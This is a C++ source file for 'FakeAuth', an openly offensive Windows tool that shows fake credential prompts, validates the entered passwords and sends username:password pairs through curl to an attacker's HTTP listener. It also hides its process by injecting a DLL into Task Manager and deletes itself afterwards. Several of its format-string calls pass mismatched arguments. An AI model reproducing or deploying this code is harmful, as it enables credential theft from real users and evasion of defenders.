#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif


#include <iostream>
#include <Windows.h>
#include <wincred.h>
#include <strsafe.h>
#include <TlHelp32.h>
#include <string>

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
#define SELF_REMOVEDLL_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
#pragma comment(lib, "Credui.lib")

using namespace std;
HANDLE map;
LPVOID buf;

VOID PrintLogo() {
	wprintf(L"\n< FakeAuth v1.01 | atn1ght/Github | @atn1ght1/Twitter >\n");
	wprintf(L"   \\\n");
	wprintf(L"    \\\n");
	wprintf(L"        .--.\n");
	wprintf(L"       |o_o |\n");
	wprintf(L"       |:_/ |\n");
	wprintf(L"      //   \\ \\\n");
	wprintf(L"     (|     | )\n");
	wprintf(L"    /'\\_   _/`\\\n");
	wprintf(L"    \\___)=(___/\n");
	wprintf(L"\n");
	wprintf(L"Usage:   FakeAuth.exe <hide> <mode> <type> <count> <title> <message> <listener>\n");
	wprintf(L"Example: FakeAuth.exe 1 1 1 10 window_title enter_creds 10.0.0.0:80\n\n");
	wprintf(L"hide     (integer) -> Hide Process in Taskmgr by WinAPI-Hook (0,1 - requires FakeAuth.dll) \n");
	wprintf(L"mode     (integer) -> Self-Delete at process stop (0,1) - .dll only possible if taskmgr closed!\n");
	wprintf(L"type     (integer) -> Prompt Style (1,2)\n");
	wprintf(L"count    (long)    -> How many prompts after invalid Credentials (0,1,2,..,n 0=unlimited)\n");
	wprintf(L"title    (string)  -> Prompt title (visible in type=1 only)\n");
	wprintf(L"message  (string)  -> Window message\n");
	wprintf(L"listener (string)  -> HTTP exfiltration listener (10.0.0.0:80), if not specified print stdout\n\n");
	return;
}

bool inject_dll(DWORD pid, string dll_path) {

	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (handle == INVALID_HANDLE_VALUE) {
		cout << " [-] Open Process Failed" << endl;
		return false;
	}
	else { cout << " [+] Got a Handle to the Remote Process" << endl; }

	LPVOID address = VirtualAllocEx(handle, NULL, dll_path.length(), MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (address == NULL) {
		cout << " [-] VirtualAllocEx Failed" << endl;
		return false;
	}

	bool res = WriteProcessMemory(handle, address, dll_path.c_str(), dll_path.length(), 0);
	if (!res) {
		cout << " [-] WriteProcessMemory Failed" << endl;
	}
	if (CreateRemoteThread(handle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, (LPVOID)address, NULL, NULL) == INVALID_HANDLE_VALUE) {
		cout << " [-] CreateRemoteThread Failed" << endl;
	}
	else { cout << " [+] DLL Loaded Into Remote Process" << endl; }

	cout << " [+] Process Hidden" << endl << endl;
	CloseHandle(handle);
	return true;
}

void find_and_inject()
{
	char* dll_path_c = (char*)malloc(sizeof(char) * 3000);
	GetModuleFileNameA(NULL, dll_path_c, 3000);

	DWORD lastpid = 4;
	string dll_path(dll_path_c);
	size_t index = dll_path.find_last_of('\\');
	dll_path.erase(dll_path.begin() + index, dll_path.end());
	dll_path.append("\\FakeAuth.dll");

	while (true) {		// Keep running to check if TM closes and reopens, if yes then inject again
		PROCESSENTRY32 process;
		process.dwSize = sizeof(PROCESSENTRY32);

		HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (proc_snap == INVALID_HANDLE_VALUE) {
			cout << " [-] CreateToolhelp32Snapshot Failed" << endl;
			return;
		}

		if (!Process32First(proc_snap, &process)) {
			cout << " [-] Process32First Failed" << endl;
			return;
		}

		do
		{
			if (!lstrcmp(process.szExeFile, L"Taskmgr.exe") && lastpid != process.th32ProcessID) {
				cout << " [+] Task Manager Detected" << endl;
				if (!inject_dll(process.th32ProcessID, dll_path)) {
					cout << " [-] Unable to Inject DLL!! Check if you are running as Admin" << endl << endl;
					break;
				}
				lastpid = process.th32ProcessID;
			}
		} while (Process32Next(proc_snap, &process));
		CloseHandle(proc_snap);
		Sleep(1000);
	}
}

bool map_process_name(string process) {
	map = CreateFileMappingA(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_READWRITE,
		0,
		255,
		"Global\\GetProcessName"
	);

	if (map == NULL) {
		cout << "CreateFileMapping Failed" << endl;
		return false;
	}

	buf = MapViewOfFile(map,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		255);

	if (buf == NULL) {
		cout << "MapViewOfFile Failed" << endl;
		CloseHandle(map);
		return 0;
	}

	CopyMemory(buf, process.c_str(), process.length());
}

void selfdelete()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);
	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

void selfdeletedll()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);
	szModuleName[wcslen(szModuleName) - 1] = 'l';
	szModuleName[wcslen(szModuleName) - 2] = 'l';
	szModuleName[wcslen(szModuleName) - 3] = 'd';
	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVEDLL_STRING, szModuleName);
	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

void type1(int n, char* title, char* msg, char* url = NULL) {

	wchar_t promptCaption[20];
	mbstowcs(promptCaption, title, strlen(title) + 1);
	LPWSTR ptr = promptCaption;

	wchar_t promptMessage[20];
	mbstowcs(promptMessage, msg, strlen(msg) + 1);
	LPWSTR ptrx = promptMessage;

	CREDUI_INFO ci = { sizeof(ci) };
	ci.pszCaptionText = promptCaption;
	ci.pszMessageText = promptMessage;

	WCHAR username[255] = {};
	WCHAR password[255] = {};
	WCHAR res[1024] = {};
	DWORD result = 0;
	char x[255];

	int i = 0;
	do {
		if (url != NULL) {
			sprintf(x, "curl http://%s/?res=%i_prompt", i + 1);
			system(x);
		} else {
			printf("[.] Prompt created! (%i/%i)\n", i + 1, n);
		}
		result = CredUIPromptForCredentialsW(&ci, L".", NULL, 5, username, 255, password, 255, FALSE, CREDUI_FLAGS_GENERIC_CREDENTIALS);
		if (result == ERROR_SUCCESS)
		{
			HANDLE newToken = NULL;
			BOOL credentialsValid = FALSE;

			credentialsValid = LogonUserW(username, NULL, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &newToken);
			if (credentialsValid)
			{
				if (url != NULL) {
					sprintf(x, "curl http://%s/?res=%i_valid_%S:%S", i + 1, url, username, password);
					system(x);
				} else {
					printf("[+] Valid credentials entered!  %S:%S (%i/%i)\n", username, password, i + 1, n);
				}
				i = n;
			} else {
				if (url != NULL) {
					sprintf(x, "curl http://%s/?res=%i_invalid_%S:%S", i + 1, url, username, password);
					system(x);
				}
				else {
					printf("[-] Invalid credentials entered!  %S:%S (%i/%i)\n", username, password, i + 1, n);
				}

				if (n == 0)
					i = -1;
				else
					i++;
			}
		}
		else if (result == ERROR_CANCELLED)
		{
			if (url != NULL) {
				sprintf(x, "curl http://%s/?res=%i_canceled", i + 1);
				system(x);
			} else {
				printf("[-] Prompt canceled! (%i/%i)\n", i + 1, n);
			}
			if (n == 0)
				i = -1;
			else
				i++;
		}
	} while (i < n);
}

void type2(long n, char* msg, char* url = NULL) {
	int i = 0;

	wchar_t promptMessage[20];
	mbstowcs(promptMessage, msg, strlen(msg) + 1);
	LPWSTR ptrx = promptMessage;


	BOOL loginStatus = FALSE;
	do {
		CREDUI_INFOW credui = {};
		credui.cbSize = sizeof(credui);
		credui.hwndParent = nullptr;
		credui.pszCaptionText = promptMessage;
		credui.hbmBanner = nullptr;

		ULONG authPackage = 0;
		LPVOID outCredBuffer = nullptr;
		ULONG outCredSize = 0;
		BOOL save = false;
		DWORD err = 0;
		char x[255];

		if (url != NULL) {
			sprintf(x, "curl http://%s/?res=%i_prompt", i + 1);
			system(x);
		} else {
			std::wcout << "\n[.] Prompt created!" << " (" << i + 1 << "/" << n << ")";
		}

		err = CredUIPromptForWindowsCredentialsW(&credui, err, &authPackage, nullptr, 0, &outCredBuffer, &outCredSize, &save, CREDUIWIN_ENUMERATE_CURRENT_USER);
		if (err == ERROR_SUCCESS) {
			WCHAR pszUName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR pszPwd[CREDUI_MAX_PASSWORD_LENGTH * sizeof(WCHAR)];
			WCHAR domain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			DWORD maxLenName = CREDUI_MAX_USERNAME_LENGTH + 1;
			DWORD maxLenPassword = CREDUI_MAX_PASSWORD_LENGTH + 1;
			DWORD maxLenDomain = CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1;
			CredUnPackAuthenticationBufferW(CRED_PACK_PROTECTED_CREDENTIALS, outCredBuffer, outCredSize, pszUName, &maxLenName, domain, &maxLenDomain, pszPwd, &maxLenPassword);

			WCHAR parsedUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR parsedDomain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			CredUIParseUserNameW(pszUName, parsedUserName, CREDUI_MAX_USERNAME_LENGTH + 1, parsedDomain, CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1);

			HANDLE handle = nullptr;
			loginStatus = LogonUserW(parsedUserName, parsedDomain, pszPwd, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &handle);

			if (loginStatus == TRUE) {
				CloseHandle(handle);

				if (url != NULL) {
					sprintf(x, "curl http://%s/?res=%i_valid_%S:%S", i + 1, url, pszUName, pszPwd);
					printf("%s", x);
					system(x);
				} else {
					std::wcout << "\n[+] Valid credentials entered!" << pszUName << ":" << pszPwd << " (" << i + 1 << "/" << n << ")";
				}
				i++;
				break;
			}
			else {

				if (url != NULL) {
					sprintf(x, "curl http://%s/?res=%i_invalid_%S:%S", i + 1, url, pszUName, pszPwd);
					system(x);
				} else {
					std::wcout << "\n[-] Invalid credentials entered! " << pszUName << ":" << pszPwd << " (" << i + 1 << "/" << n << ")";
				}
				loginStatus = FALSE;
				i++;
				if (n == 0)
					i = -1;
			}
		} else {
			if (url != NULL) {
				sprintf(x, "curl http://%s/?res=%i_canceled", i + 1);
				system(x);
			} else {
				std::wcout << "\n[.] Prompt canceled!" << " (" << i + 1 << "/" << n << ")";
			}
			if (n == 0)
				i = -1;
			else
				i++;
		}
	} while (i < n);
}

void main(int argc, char* argv[])
{
	long l = 23975297960935;
	
	if (argc < 4) {
		PrintLogo();
		return;
	}

	long n = strtol(argv[4], NULL, 10);
	long type = strtol(argv[3], NULL, 10);
	long mode = strtol(argv[2], NULL, 10);
	long hide = strtol(argv[1], NULL, 10);

	if (hide == 1) {
		printf("[.] Install Hook\n");
		string process, inp;
		process = "FakeAuth.exe";
		map_process_name(process);

		CreateThread(
			NULL,
			NULL,
			(LPTHREAD_START_ROUTINE)find_and_inject,
			NULL,
			NULL,
			NULL
		);
	}

	if (type == 1) {
		if (argc > 7) {
			type1(n, argv[5], argv[6], argv[7]);
		} else {
			type1(n, argv[5], argv[6], NULL);
		}
	}
	else if (type == 2) {
		if (argc > 7) {
			type2(n, argv[6], argv[7]);
		} else {
			type2(n, argv[6], NULL);
		}
	}
	
	if (hide == 1) {
		printf("[.] Remove Hook\n");
		UnmapViewOfFile(buf);
		CloseHandle(map);
		//ExitProcess(0);
	}

	if (mode == 1) {
		printf("[.] Delete Dll\n");
		selfdeletedll();
		printf("[.] Delete Exe\n");
		selfdelete();
	}

	
	return;
}